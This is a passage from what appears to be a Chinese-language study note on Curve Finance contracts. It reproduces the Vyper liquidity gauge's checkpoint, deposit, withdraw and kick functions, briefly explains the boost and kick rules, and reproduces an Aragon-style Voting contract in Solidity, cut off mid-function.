week_time:\n                    # If we went across one or multiple epochs, apply the rate\n                    # of the first epoch until it ends, and then the rate of\n                    # the last epoch.\n                    # If more than one epoch is crossed - the gauge gets less,\n                    # but that'd meen it wasn't called for more than 1 year\n                    _integrate_inv_supply += rate * w * (prev_future_epoch - prev_week_time) / _working_supply\n                    rate = new_rate\n                    _integrate_inv_supply += rate * w * (week_time - prev_future_epoch) / _working_supply\n                else:\n                    _integrate_inv_supply += rate * w * dt / _working_supply\n                # On precisions of the calculation\n                # rate ~= 10e18\n                # last_weight > 0.01 * 1e18 = 1e16 (if pool weight is 1%)\n                # _working_supply ~= TVL * 1e18 ~= 1e26 ($100M for example)\n                # The largest loss is at dt = 1\n                # Loss is 1e-9 - acceptable\n\n            if week_time == block.timestamp:\n                break\n            prev_week_time = week_time\n            week_time = min(week_time + WEEK, block.timestamp)\n\n    _period += 1\n    self.period = _period\n    self.period_timestamp[_period] = block.timestamp\n    self.integrate_inv_supply[_period] = _integrate_inv_supply\n\n    # Update user-specific integrals\n    self.integrate_fraction[addr] += _working_balance * (_integrate_inv_supply - self.integrate_inv_supply_of[addr]) / 10 ** 18\n    self.integrate_inv_supply_of[addr] = _integrate_inv_supply\n    self.integrate_checkpoint_of[addr] = block.timestamp\n\n\n@external\ndef user_checkpoint(addr: address) -> bool:\n    \"\"\"\n    @notice Record a checkpoint for `addr`\n    @param addr User address\n    @return bool success\n    \"\"\"\n    assert (msg.sender == addr) or (msg.sender == self.minter)  # dev: unauthorized\n    self._checkpoint(addr)\n    self._update_liquidity_limit(addr, self.balanceOf[addr], self.totalSupply)\n    return True\n\n\n@external\ndef claimable_tokens(addr: address) -> uint256:\n    \"\"\"\n    @notice Get the number of claimable tokens per user\n    @dev This function should be manually changed to \"view\" in the ABI\n    @return uint256 number of claimable tokens per user\n    \"\"\"\n    self._checkpoint(addr)\n    return self.integrate_fraction[addr] - Minter(self.minter).minted(addr, self)\n\n\n@external\ndef kick(addr: address):\n    \"\"\"\n    @notice Kick `addr` for abusing their boost\n    @dev Only if either they had another voting event, or their voting escrow lock expired\n    @param addr Address to kick\n    \"\"\"\n    _voting_escrow: address = self.voting_escrow\n    t_last: uint256 = self.integrate_checkpoint_of[addr]\n    t_ve: uint256 = VotingEscrow(_voting_escrow).user_point_history__ts(\n        addr, VotingEscrow(_voting_escrow).user_point_epoch(addr)\n    )\n    _balance: uint256 = self.balanceOf[addr]\n\n    assert ERC20(self.voting_escrow).balanceOf(addr) == 0 or t_ve > t_last # dev: kick not allowed\n    assert self.working_balances[addr] > _balance * TOKENLESS_PRODUCTION / 100  # dev: kick not needed\n\n    self._checkpoint(addr)\n    self._update_liquidity_limit(addr, self.balanceOf[addr], self.totalSupply)\n\n\n@external\ndef set_approve_deposit(addr: address, can_deposit: bool):\n    \"\"\"\n    @notice Set whether `addr` can deposit tokens for `msg.sender`\n    @param addr Address to set approval on\n    @param can_deposit bool - can this account deposit for `msg.sender`?\n    \"\"\"\n    self.approved_to_deposit[addr][msg.sender] = can_deposit\n\n\n@external\n@nonreentrant('lock')\ndef deposit(_value: uint256, addr: address = msg.sender):\n    \"\"\"\n    @notice Deposit `_value` LP tokens\n    @param _value Number of tokens to deposit\n    @param addr Address to deposit for\n    \"\"\"\n    if addr != msg.sender:\n        assert self.approved_to_deposit[msg.sender][addr], \"Not approved\"\n\n    self._checkpoint(addr)\n\n    if _value != 0:\n        _balance: uint256 = self.balanceOf[addr] + _value\n        _supply: uint256 = self.totalSupply + _value\n        self.balanceOf[addr] = _balance\n        self.totalSupply = _supply\n\n        self._update_liquidity_limit(addr, _balance, _supply)\n\n        assert ERC20(self.lp_token).transferFrom(msg.sender, self, _value)\n\n    log Deposit(addr, _value)\n\n\n@external\n@nonreentrant('lock')\ndef withdraw(_value: uint256):\n    \"\"\"\n    @notice Withdraw `_value` LP tokens\n    @param _value Number of tokens to withdraw\n    \"\"\"\n    self._checkpoint(msg.sender)\n\n    _balance: uint256 = self.balanceOf[msg.sender] - _value\n    _supply: uint256 = self.totalSupply - _value\n    self.balanceOf[msg.sender] = _balance\n    self.totalSupply = _supply\n\n    self._update_liquidity_limit(msg.sender, _balance, _supply)\n\n    assert ERC20(self.lp_token).transfer(msg.sender, _value)\n\n    log Withdraw(msg.sender, _value)\n\n\n@external\n@view\ndef integrate_checkpoint() -> uint256:\n    return self.period_timestamp[self.period]\n\n\n\nAnalyzeboost计算公式：\n\n代码实现方式：\n\n最终用户获得的奖励在_checkpoint函数中确定：\ndef _checkpoint(addr: address):\n    \"\"\"\n    @notice Checkpoint for a user\n    @param addr User address\n    \"\"\"\n    _token: address = self.crv_token\n    _controller: address = self.controller\n    _period: int128 = self.period\n    _period_time: uint256 = self.period_timestamp[_period]\n    _integrate_inv_supply: uint256 = self.integrate_inv_supply[_period]\n    rate: uint256 = self.inflation_rate\n    new_rate: uint256 = rate\n    prev_future_epoch: uint256 = self.future_epoch_time\n    if prev_future_epoch >= _period_time:\n        self.future_epoch_time = CRV20(_token).future_epoch_time_write()\n        new_rate = CRV20(_token).rate()\n        self.inflation_rate = new_rate\n    Controller(_controller).checkpoint_gauge(self)\n\n    _working_balance: uint256 = self.working_balances[addr]\n    _working_supply: uint256 = self.working_supply\n\n    # Update integral of 1/supply\n    if block.timestamp > _period_time:\n        prev_week_time: uint256 = _period_time\n        week_time: uint256 = min((_period_time + WEEK) / WEEK * WEEK, block.timestamp)\n\n        for i in range(500):\n            dt: uint256 = week_time - prev_week_time\n            w: uint256 = Controller(_controller).gauge_relative_weight(self, prev_week_time / WEEK * WEEK)\n\n            if _working_supply > 0:\n                if prev_future_epoch >= prev_week_time and prev_future_epoch &lt; week_time:\n                    # If we went across one or multiple epochs, apply the rate\n                    # of the first epoch until it ends, and then the rate of\n                    # the last epoch.\n                    # If more than one epoch is crossed - the gauge gets less,\n                    # but that'd meen it wasn't called for more than 1 year\n                    _integrate_inv_supply += rate * w * (prev_future_epoch - prev_week_time) / _working_supply\n                    rate = new_rate\n                    _integrate_inv_supply += rate * w * (week_time - prev_future_epoch) / _working_supply\n                else:\n                    _integrate_inv_supply += rate * w * dt / _working_supply\n                # On precisions of the calculation\n                # rate ~= 10e18\n                # last_weight > 0.01 * 1e18 = 1e16 (if pool weight is 1%)\n                # _working_supply ~= TVL * 1e18 ~= 1e26 ($100M for example)\n                # The largest loss is at dt = 1\n                # Loss is 1e-9 - acceptable\n\n            if week_time == block.timestamp:\n                break\n            prev_week_time = week_time\n            week_time = min(week_time + WEEK, block.timestamp)\n\n    _period += 1\n    self.period = _period\n    self.period_timestamp[_period] = block.timestamp\n    self.integrate_inv_supply[_period] = _integrate_inv_supply\n\n    # Update user-specific integrals\n    self.integrate_fraction[addr] += _working_balance * (_integrate_inv_supply - self.integrate_inv_supply_of[addr]) / 10 ** 18\n    self.integrate_inv_supply_of[addr] = _integrate_inv_supply\n    self.integrate_checkpoint_of[addr] = block.timestamp\n\n\n以week做计算，由lock时间和lock amount共同决定\n\n\n在进行增加，记录奖励数量，计算增加总量减去用户余额即为增量，结合minter合约进行奖励发放，核心函数如下：\n\n当用户的lock token为0 || lock过期||奖励token大于实际token*40%即可被kick掉\n\n即在此处将lim更新为0，则不再参与奖励分发\nVotingCode\nClick to see more\ncontract Voting is IForwarder, AragonApp &#123;\n    using SafeMath for uint256;\n    using SafeMath64 for uint64;\n\n    uint128 private constant MAX_UINT_128 = 2 ** 128 - 1;\n    uint128 private constant MAX_UINT_64 = 2 ** 64 - 1;\n\n    bytes32 public constant CREATE_VOTES_ROLE = 0xe7dcd7275292e064d090fbc5f3bd7995be23b502c1fed5cd94cfddbbdcd32bbc; //keccak256(\"CREATE_VOTES_ROLE\");\n    bytes32 public constant MODIFY_SUPPORT_ROLE = 0xda3972983e62bdf826c4b807c4c9c2b8a941e1f83dfa76d53d6aeac11e1be650; //keccak256(\"MODIFY_SUPPORT_ROLE\");\n    bytes32 public constant MODIFY_QUORUM_ROLE = 0xad15e7261800b4bb73f1b69d3864565ffb1fd00cb93cf14fe48da8f1f2149f39; //keccak256(\"MODIFY_QUORUM_ROLE\");\n\n    bytes32 public constant SET_MIN_BALANCE_ROLE = 0xb1f3f26f63ad27cd630737a426f990492f5c674208299d6fb23bb2b0733d3d66; //keccak256(\"SET_MIN_BALANCE_ROLE\")\n    bytes32 public constant SET_MIN_TIME_ROLE = 0xe7ab0252519cd959720b328191bed7fe61b8e25f77613877be7070646d12daf0; //keccak256(\"SET_MIN_TIME_ROLE\")\n\n    bytes32 public constant ENABLE_VOTE_CREATION = 0xecb50dc3e77ba8a59697a3cc090a29b4cbd3c1f2b6b3aea524e0d166969592b9; //keccak256(\"ENABLE_VOTE_CREATION\")\n\n    bytes32 public constant DISABLE_VOTE_CREATION = 0x40b01f8b31b51596de2eeab8c325ff77cc3695c1c1875d66ff31176e7148d2a1; //keccack256(\"DISABLE_VOTE_CREATION\")\n\n    uint64 public constant PCT_BASE = 10 ** 18; // 0% = 0; 1% = 10^16; 100% = 10^18\n\n    string private constant ERROR_NO_VOTE = \"VOTING_NO_VOTE\";\n    string private constant ERROR_INIT_PCTS = \"VOTING_INIT_PCTS\";\n    string private constant ERROR_CHANGE_SUPPORT_PCTS = \"VOTING_CHANGE_SUPPORT_PCTS\";\n    string private constant ERROR_CHANGE_QUORUM_PCTS = \"VOTING_CHANGE_QUORUM_PCTS\";\n    string private constant ERROR_INIT_SUPPORT_TOO_BIG = \"VOTING_INIT_SUPPORT_TOO_BIG\";\n    string private constant ERROR_CHANGE_SUPPORT_TOO_BIG = \"VOTING_CHANGE_SUPP_TOO_BIG\";\n    string private constant ERROR_CAN_NOT_VOTE = \"VOTING_CAN_NOT_VOTE\";\n    string private constant ERROR_MALFORMED_CONTINUOUS_VOTE = \"MALFORMED_CONTINUOUS_VOTE\";\n    string private constant ERROR_CAN_NOT_EXECUTE = \"VOTING_CAN_NOT_EXECUTE\";\n    string private constant ERROR_CAN_NOT_FORWARD = \"VOTING_CAN_NOT_FORWARD\";\n    string private constant ERROR_NO_VOTING_POWER = \"VOTING_NO_VOTING_POWER\";\n\n    enum VoterState &#123; Absent, Yea, Nay, Even &#125;\n\n    struct Vote &#123;\n        bool executed;\n        uint64 startDate;\n        uint64 snapshotBlock;\n        uint64 supportRequiredPct;\n        uint64 minAcceptQuorumPct;\n        uint256 yea;\n        uint256 nay;\n        uint256 votingPower;\n        bytes executionScript;\n        mapping (address => VoterState) voters;\n    &#125;\n\n    MiniMeToken public token;\n    uint64 public supportRequiredPct;\n    uint64 public minAcceptQuorumPct;\n    uint64 public voteTime;\n\n    //2500000000000000000000\n    uint256 public minBalanceLowerLimit;\n    uint256 public minBalanceUpperLimit;\n    //43200\n    uint256 public minTimeLowerLimit;\n    //1209600\n    uint256 public minTimeUpperLimit;\n\n    uint256 public minBalance;\n    uint256 public minTime;\n\n    bool public enableVoteCreation;\n\n    // We are mimicing an array, we use a mapping instead to make app upgrade more graceful\n    mapping (uint256 => Vote) internal votes;\n    uint256 public votesLength;\n\n    mapping(address => uint256) public lastCreateVoteTimes;\n\n    event StartVote(uint256 indexed voteId, address indexed creator, string metadata, uint256 minBalance, uint256 minTime, uint256 totalSupply, uint256 creatorVotingPower);\n    event CastVote(uint256 indexed voteId, address indexed voter, bool supports, uint256 stake);\n    event ExecuteVote(uint256 indexed voteId);\n    event ChangeSupportRequired(uint64 supportRequiredPct);\n    event ChangeMinQuorum(uint64 minAcceptQuorumPct);\n\n    event MinimumBalanceSet(uint256 minBalance);\n    event MinimumTimeSet(uint256 minTime);\n\n    modifier voteExists(uint256 _voteId) &#123;\n        require(_voteId &lt; votesLength, ERROR_NO_VOTE);\n        _;\n    &#125;\n\n    modifier minBalanceCheck(uint256 _minBalance) &#123;\n        //_minBalance to be at least the equivalent of 10k locked for a year (1e18 precision)\n        require(_minBalance >= minBalanceLowerLimit &amp;&amp; _minBalance &lt;= minBalanceUpperLimit, \"Min balance should be within initialization hardcoded limits\");\n        _;\n    &#125;\n\n    modifier minTimeCheck(uint256 _minTime) &#123;\n        require(_minTime >= minTimeLowerLimit &amp;&amp; _minTime &lt;= minTimeUpperLimit, \"Min time should be within initialization hardcoded limits\");\n        _;\n    &#125;\n\n    /**\n        * @notice Initialize Voting app with `_token.symbol(): string` for governance, minimum support of `@formatPct(_supportRequiredPct)`%, minimum acceptance quorum of `@formatPct(_minAcceptQuorumPct)`%, and a voting duration of `@transformTime(_voteTime)`\n        * @param _token MiniMeToken Address that will be used as governance token\n        * @param _supportRequiredPct Percentage of yeas in casted votes for a vote to succeed (expressed as a percentage of 10^18; eg. 10^16 = 1%, 10^18 = 100%)\n        * @param _minAcceptQuorumPct Percentage of yeas in total possible votes for a vote to succeed (expressed as a percentage of 10^18; eg. 10^16 = 1%, 10^18 = 100%)\n        * @param _voteTime Seconds that a vote will be open for token holders to vote (unless enough yeas or nays have been cast to make an early decision)\n        * @param _minBalance Minumum balance that a token holder should have to create a new vote\n        * @param _minTime Minimum time between a user's previous vote and creating a new vote\n        * @param _minBalanceLowerLimit Hardcoded lower limit for _minBalance on initialization\n        * @param _minTimeLowerLimit Hardcoded lower limit for _minTime on initialization\n        * @param _minTimeUpperLimit Hardcoded upper limit for _minTime on initialization\n    */\n    function initialize(MiniMeToken _token, \n        uint64 _supportRequiredPct, \n        uint64 _minAcceptQuorumPct, \n        uint64 _voteTime,\n        uint256 _minBalance,\n        uint256 _minTime,\n        uint256 _minBalanceLowerLimit,\n        uint256 _minBalanceUpperLimit,\n        uint256 _minTimeLowerLimit,\n        uint256 _minTimeUpperLimit\n    ) external onlyInit &#123;\n        assert(CREATE_VOTES_ROLE == keccak256(\"CREATE_VOTES_ROLE\"));\n        assert(MODIFY_SUPPORT_ROLE == keccak256(\"MODIFY_SUPPORT_ROLE\"));\n        assert(MODIFY_QUORUM_ROLE == keccak256(\"MODIFY_QUORUM_ROLE\"));\n        assert(SET_MIN_BALANCE_ROLE == keccak256(\"SET_MIN_BALANCE_ROLE\"));\n        assert(SET_MIN_TIME_ROLE == keccak256(\"SET_MIN_TIME_ROLE\"));\n        assert(DISABLE_VOTE_CREATION == keccak256(\"DISABLE_VOTE_CREATION\"));\n        assert(ENABLE_VOTE_CREATION == keccak256(\"ENABLE_VOTE_CREATION\"));\n\n        initialized();\n\n        require(_minAcceptQuorumPct &lt;= _supportRequiredPct, ERROR_INIT_PCTS);\n        require(_supportRequiredPct &lt; PCT_BASE, ERROR_INIT_SUPPORT_TOO_BIG);\n\n        require(_minBalance >= _minBalanceLowerLimit &amp;&amp; _minBalance &lt;= _minBalanceUpperLimit);\n        require(_minTime >= _minTimeLowerLimit &amp;&amp; _minTime &lt;= _minTimeUpperLimit);\n\n        token = _token;\n        supportRequiredPct = _supportRequiredPct;\n        minAcceptQuorumPct = _minAcceptQuorumPct;\n        voteTime = _voteTime;\n\n        uint256 decimalsMul = uint256(10) ** token.decimals();\n\n        minBalance = _minBalance.mul(decimalsMul);\n        minTime = _minTime;\n\n        minBalanceLowerLimit = _minBalanceLowerLimit.mul(decimalsMul);\n        minBalanceUpperLimit = _minBalanceUpperLimit.mul(decimalsMul);\n        minTimeLowerLimit = _minTimeLowerLimit;\n        minTimeUpperLimit = _minTimeUpperLimit;\n\n        emit MinimumBalanceSet(minBalance);\n        emit MinimumTimeSet(minTime);\n\n        enableVoteCreation = true;\n    &#125;\n\n    /**\n    * @notice Change required support to `@formatPct(_supportRequiredPct)`%\n    * @param _supportRequiredPct New required support\n    */\n    function changeSupportRequiredPct(uint64 _supportRequiredPct)\n        external\n        authP(MODIFY_SUPPORT_ROLE, arr(uint256(_supportRequiredPct), uint256(supportRequiredPct)))\n    &#123;\n        require(minAcceptQuorumPct &lt;= _supportRequiredPct, ERROR_CHANGE_SUPPORT_PCTS);\n        require(_supportRequiredPct &lt; PCT_BASE, ERROR_CHANGE_SUPPORT_TOO_BIG);\n        supportRequiredPct = _supportRequiredPct;\n\n        emit ChangeSupportRequired(_supportRequiredPct);\n    &#125;\n\n    /**\n    * @notice Change minimum acceptance quorum to `@formatPct(_minAcceptQuorumPct)`%\n    * @param _minAcceptQuorumPct New acceptance quorum\n    */\n    function changeMinAcceptQuorumPct(uint64 _minAcceptQuorumPct)\n        external\n        authP(MODIFY_QUORUM_ROLE, arr(uint256(_minAcceptQuorumPct), uint256(minAcceptQuorumPct)))\n    &#123;\n        require(_minAcceptQuorumPct &lt;= supportRequiredPct, ERROR_CHANGE_QUORUM_PCTS);\n        minAcceptQuorumPct = _minAcceptQuorumPct;\n\n        emit ChangeMinQuorum(_minAcceptQuorumPct);\n    &#125;\n\n    /**\n    * @notice Change minimum balance needed to create a vote to `_minBalance`\n    * @param _minBalance New minimum balance\n    */\n\n    function setMinBalance(uint256 _minBalance) external auth(SET_MIN_BALANCE_ROLE) minBalanceCheck(_minBalance) &#123;\n        //min balance can't be set to lower than 10k * 1 year\n        minBalance = _minBalance;\n\n        emit MinimumBalanceSet(_minBalance);\n    &#125;\n\n    /**\n    * @notice Change minimum time needed to pass between user's previous vote and a user creating a new vote\n    * @param _minTime New minumum time\n    */\n\n    function setMinTime(uint256 _minTime) external auth(SET_MIN_TIME_ROLE) minTimeCheck(_minTime) &#123;\n        //min time should be within initialized hardcoded limits\n        minTime = _minTime;\n\n        emit MinimumTimeSet(_minTime);\n    &#125;\n\n    //later role will be set to 0x0 - noone\n    function disableVoteCreationOnce() external auth(DISABLE_VOTE_CREATION) &#123;\n        enableVoteCreation = false;\n    &#125;\n\n    function enableVoteCreationOnce() external auth(ENABLE_VOTE_CREATION) &#123;\n        enableVoteCreation = true;\n    &#125;\n\n    /**\n    * @notice Create a new vote about \"`_metadata`\"\n    * @param _executionScript EVM script to be executed on approval\n    * @param _metadata Vote metadata\n    * @return voteId Id for newly created vote\n    */\n    function newVote(bytes _executionScript, string _metadata) external auth(CREATE_VOTES_ROLE) returns (uint256 voteId) &#123;\n        return _newVote(_executionScript, _metadata, true, true);\n    &#125;\n\n    /**\n    * @notice Create a new vote about \"`_metadata`\"\n    * @param _executionScript EVM script to be executed on approval\n    * @param _metadata Vote metadata\n    * @param _castVote Whether to also cast newly created vote\n    * @param _executesIfDecided Whether to also immediately execute newly created vote if decided\n    * @return voteId id for newly created vote\n    */\n    function newVote(bytes _executionScript, string _metadata, bool _castVote, bool _executesIfDecided)\n        external\n        auth(CREATE_VOTES_ROLE)\n        returns (uint256 voteId)\n    &#123;\n        return _newVote(_executionScript, _metadata, _castVote, _executesIfDecided);\n    &#125;\n\n    /**\n    * @notice Vote a percentage value in favor of a vote\n    * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n    *      created via `newVote(),` which requires initialization\n    * @param _voteData Packed vote data containing both voteId and the vote in favor percentage (where 0 is no, and 1e18 is yes)\n    *          Vote data packing\n    * |  yeaPct  |  nayPct  |   voteId  |\n    * |  64b     |  64b     |   128b    |\n    * @param _supports Whether voter supports the vote (preserved for backward compatibility purposes)\n    * @param _executesIfDecided Whether the vote should execute its action if it becomes decided\n    */\n    function vote(uint256 _voteData, bool _supports, bool _executesIfDecided) external voteExists(_decodeData(_voteData, 0, MAX_UINT_128)) &#123;\n        uint256 voteId = _decodeData(_voteData, 0, MAX_UINT_128);\n        uint256 nayPct = _decodeData(_voteData, 128, MAX_UINT_64);\n        uint256 yeaPct = _decodeData(_voteData, 192, MAX_UINT_64);\n        //256位，前128为voteid，后128中的前64为否定票，后64为支持票\n\n        require(_canVote(voteId, msg.sender), ERROR_CAN_NOT_VOTE);\n\n        if (yeaPct == 0 &amp;&amp; nayPct == 0) &#123;\n            // Keep backwards compatibility\n            if (_supports) &#123;\n                yeaPct = PCT_BASE;\n            &#125; else &#123;\n                nayPct = PCT_BASE;\n            &#125;\n        &#125; else &#123;\n            require(!_supports &amp;&amp; yeaPct.add(nayPct) &lt;= PCT_BASE, ERROR_MALFORMED_CONTINUOUS_VOTE);\n        &#125;\n        _vote(voteId, yeaPct, nayPct, msg.sender, _executesIfDecided);\n    &#125;\n\n    /**\n        * @notice Vote `@formatPct(_yeaPct)`% in favor and `@formatPct(_nayPct)`% against of vote #`_voteId`\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @param _voteId Id for vote\n        * @param _yeaPct Percentage of support, where 0 is no support, and 1e18 is total support\n        * @param _nayPct Percentage of opposition, where 0 is no oposition, and 1e18 is total oposition\n        * @param _executesIfDecided Whether the vote should execute its action if it becomes decided\n    */\n    function votePct(uint256 _voteId, uint256 _yeaPct, uint256 _nayPct, bool _executesIfDecided) external voteExists(_voteId) &#123;\n        require(_canVote(_voteId, msg.sender), ERROR_CAN_NOT_VOTE);\n        require(_yeaPct.add(_nayPct) &lt;= PCT_BASE, ERROR_MALFORMED_CONTINUOUS_VOTE);\n        _vote(_voteId, _yeaPct, _nayPct, msg.sender, _executesIfDecided);\n    &#125;\n\n    /**\n    * @notice Execute vote #`_voteId`\n    * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n    *      created via `newVote(),` which requires initialization\n    * @param _voteId Id for vote\n    */\n    function executeVote(uint256 _voteId) external voteExists(_voteId) &#123;\n        _executeVote(_voteId);\n    &#125;\n\n    // Forwarding fns\n\n    /**\n    * @notice Tells whether the Voting app is a forwarder or not\n    * @dev IForwarder interface conformance\n    * @return Always true\n    */\n    function isForwarder() external pure returns (bool) &#123;\n        return true;\n    &#125;\n\n    /**\n    * @notice Creates a vote to execute the desired action, and casts a support vote if possible\n    * @dev IForwarder interface conformance\n    * @param _evmScript Start vote with script\n    */\n    function forward(bytes _evmScript) public &#123;\n        require(canForward(msg.sender, _evmScript), ERROR_CAN_NOT_FORWARD);\n        _newVote(_evmScript, \"\", true, true);\n    &#125;\n\n    /**\n        * @notice Tells whether `_sender` can forward actions or not\n        * @dev IForwarder interface conformance\n        * @param _sender Address of the account intending to forward an action\n        * @return True if the given address can create votes, false otherwise\n    */\n    function canForward(address _sender, bytes) public view returns (bool) &#123;\n        // Note that `canPerform()` implicitly does an initialization check itself\n        return canPerform(_sender, CREATE_VOTES_ROLE, arr()) &amp;&amp; canCreateNewVote(_sender);\n    &#125;\n\n    // Getter fns\n\n    /**\n        * @notice Tells whether a vote #`_voteId` can be executed or not\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @return True if the given vote can be executed, false otherwise\n    */\n    function canExecute(uint256 _voteId) public view voteExists(_voteId) returns (bool) &#123;\n        return _canExecute(_voteId);\n    &#125;\n\n    /**\n        * @notice Tells whether `_sender` can participate in the vote #`_voteId` or not\n        * @dev Initialization check is implicitly provided by `voteExists()` as new votes can only be\n        *      created via `newVote(),` which requires initialization\n        * @return True if the given voter can participate a certain vote, false otherwise\n    */\n    function canVote(uint256 _voteId, address _voter) public view voteExists(_voteId) returns (bool) &#123;\n        return _canVote(_voteId, _voter);\n    &#125;\n\n    function canCreateNewVote(address _sender) public view returns(bool) &#123;\n        return enableVoteCreation &amp;&amp; token.balanceOf(_sender) >= minBalance &amp;&amp;  block.timestamp.sub(minTime) >= lastCreateVoteTimes[_sender];\n    &#125;\n\n    /**\n        * @dev Return all information for a vote by its ID\n        * @param _voteId Vote identifier\n        * @return Vote open status\n        * @return Vote executed status\n        * @return Vote start date\n        * @return Vote snapshot block\n        * @return Vote support required\n        * @return Vote minimum acceptance quorum\n        * @return Vote yeas amount\n        * @return Vote nays amount\n        * @return Vote power\n        * @return Vote script\n    */\n    function getVote(uint256 _voteId)\n        public\n        view\n        voteExists(_voteId)\n        returns (\n            bool open,\n            bool executed,\n            uint64 startDate,\n            uint64 snapshotBlock,\n            uint64 supportRequired,\n            uint64 minAcceptQuorum,\n            uint256 yea,\n            uint256 nay,\n            uint256 votingPower,\n            bytes script\n        )\n    &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        open = _isVoteOpen(vote_);\n        executed = vote_.executed;\n        startDate = vote_.startDate;\n        snapshotBlock = vote_.snapshotBlock;\n        supportRequired = vote_.supportRequiredPct;\n        minAcceptQuorum = vote_.minAcceptQuorumPct;\n        yea = vote_.yea;\n        nay = vote_.nay;\n        votingPower = vote_.votingPower;\n        script = vote_.executionScript;\n    &#125;\n\n    /**\n        * @dev Return the state of a voter for a given vote by its ID\n        * @param _voteId Vote identifier\n        * @return VoterState of the requested voter for a certain vote\n    */\n    function getVoterState(uint256 _voteId, address _voter) public view voteExists(_voteId) returns (VoterState) &#123;\n        return votes[_voteId].voters[_voter];\n    &#125;\n\n    // Internal fns\n\n    /**\n        * @dev Internal function to create a new vote\n        * @return voteId id for newly created vote\n    */\n    function _newVote(bytes _executionScript, string _metadata, bool _castVote, bool _executesIfDecided) internal returns (uint256 voteId) &#123;\n        require(canCreateNewVote(msg.sender));\n        uint64 snapshotBlock = getBlockNumber64() - 1; // avoid double voting in this very block\n        uint256 votingPower = token.totalSupplyAt(snapshotBlock);\n        require(votingPower > 0, ERROR_NO_VOTING_POWER);\n\n        voteId = votesLength++;\n\n        Vote storage vote_ = votes[voteId];\n        vote_.startDate = getTimestamp64();\n        vote_.snapshotBlock = snapshotBlock;\n        vote_.supportRequiredPct = supportRequiredPct;\n        vote_.minAcceptQuorumPct = minAcceptQuorumPct;\n        vote_.votingPower = votingPower;\n        vote_.executionScript = _executionScript;\n\n        emit StartVote(voteId, msg.sender, _metadata, minBalance, minTime, token.totalSupply(), token.balanceOfAt(msg.sender, snapshotBlock));\n\n        lastCreateVoteTimes[msg.sender] = getTimestamp64();\n\n        if (_castVote &amp;&amp; _canVote(voteId, msg.sender)) &#123;\n            _vote(voteId, PCT_BASE, 0, msg.sender, _executesIfDecided);\n        &#125;\n    &#125;\n\n    /**\n        * @dev Internal function to cast a vote. It assumes the queried vote exists.\n    */\n    function _vote(uint256 _voteId, uint256 _yeaPct, uint256 _nayPct, address _voter, bool _executesIfDecided) internal &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        VoterState state = vote_.voters[_voter];\n        require(state == VoterState.Absent, \"Can't change votes\");\n        // This could re-enter, though we can assume the governance token is not malicious\n        uint256 balance = token.balanceOfAt(_voter, vote_.snapshotBlock);\n        uint256 voterStake = uint256(2).mul(balance).mul(vote_.startDate.add(voteTime).sub(getTimestamp64())).div(voteTime);\n        if(voterStake > balance) &#123;\n            voterStake = balance;\n        &#125;\n\n        uint256 yea = voterStake.mul(_yeaPct).div(PCT_BASE);\n        uint256 nay = voterStake.mul(_nayPct).div(PCT_BASE);\n\n        if (yea > 0) &#123;\n            vote_.yea = vote_.yea.add(yea);\n        &#125;\n        if (nay > 0) &#123;\n            vote_.nay = vote_.nay.add(nay);\n        &#125;\n\n        vote_.voters[_voter] = yea == nay ? VoterState.Even : yea > nay ? VoterState.Yea : VoterState.Nay;\n\n        if (yea > 0) &#123;\n          emit CastVote(_voteId, _voter, true, yea);\n        &#125;\n        if (nay > 0) &#123;\n          emit CastVote(_voteId, _voter, false, nay);\n        &#125;\n\n        if (_executesIfDecided &amp;&amp; _canExecute(_voteId)) &#123;\n            // We've already checked if the vote can be executed with `_canExecute()`\n            _unsafeExecuteVote(_voteId);\n        &#125;\n    &#125;\n\n    /**\n    * @dev Internal function to execute a vote. It assumes the queried vote exists.\n    */\n    function _executeVote(uint256 _voteId) internal &#123;\n        require(_canExecute(_voteId), ERROR_CAN_NOT_EXECUTE);\n        _unsafeExecuteVote(_voteId);\n    &#125;\n\n    /**\n    * @dev Unsafe version of _executeVote that assumes you have already checked if the vote can be executed and exists\n    */\n    function _unsafeExecuteVote(uint256 _voteId) internal &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        vote_.executed = true;\n\n        bytes memory input = new bytes(0); // TODO: Consider input for voting scripts\n        runScript(vote_.executionScript, input, new address[](0));\n\n        emit ExecuteVote(_voteId);\n    &#125;\n\n    /**\n    * @dev Internal function to check if a vote can be executed. It assumes the queried vote exists.\n    * @return True if the given vote can be executed, false otherwise\n    */\n    function _canExecute(uint256 _voteId) internal view returns (bool) &#123;\n        Vote storage vote_ = votes[_voteId];\n\n        if(_isVoteOpen(vote_)) &#123;\n            return false;\n        &#125;\n\n        if (vote_.executed) &#123;\n            return false;\n        &#125;\n\n        // Voting is already decided\n        if (_isValuePct(vote_.yea, vote_.votingPower, vote_.supportRequiredPct)) &#123;\n            return true;\n        &#125;\n\n        // Vote ended?\n        if(_isVoteOpen(vote_)) &#123;\n            return false;\n        &#125;\n        // Has enough support?\n        uint256 totalVotes = vote_.yea.add(vote_.nay);\n        if (!_isValuePct(vote_.yea, totalVotes, vote_.supportRequiredPct)) &#123;\n            return false;\n        &#125;\n        // Has min quorum?\n        if (!_isValuePct(vote_.yea, vote_.votingPower, vote_.minAcceptQuorumPct)) &#123;\n            return false;\n        &#125;\n\n        return true;\n    &#125;\n\n    /**\n    * @dev Internal function to check if a voter can participate on a vote. It assumes the queried vote exists.\n    * @return True if the given voter can participate a certain vote, false otherwise\n    */\n    function _canVote(uint256 _voteId, address _voter) internal view returns (bool) &#123;\n        Vote storage vote_ = votes[_voteId];\n        return _isVoteOpen(vote_) &amp;&amp; token.balanceOfAt(_voter, vote_.snapshotBlock) > 0;\n    &#125;\n\n    /**\n    * @dev Internal function to check if a vote is still open\n    * @return True if the given vote is open, false otherwise\n    */\n    function _isVoteOpen(Vote storage vote_) internal view returns (bool) &#123;\n        return getTimestamp64() &lt; vote_.startDate.add(voteTime) &amp;&amp; !vote_.executed;\n    &#125;\n\n    /**\n    * @dev Calculates whether `_value` is more than a percentage `_pct` of `_total`\n    */\n    function _isValuePct(uint256 _value, uint256 _total, uint256 _pct) internal pure returns (bool) &#123;\n        if (_total == 0) &#123;\n            return false;\n        &#125;\n\n        uint256 computedPct = 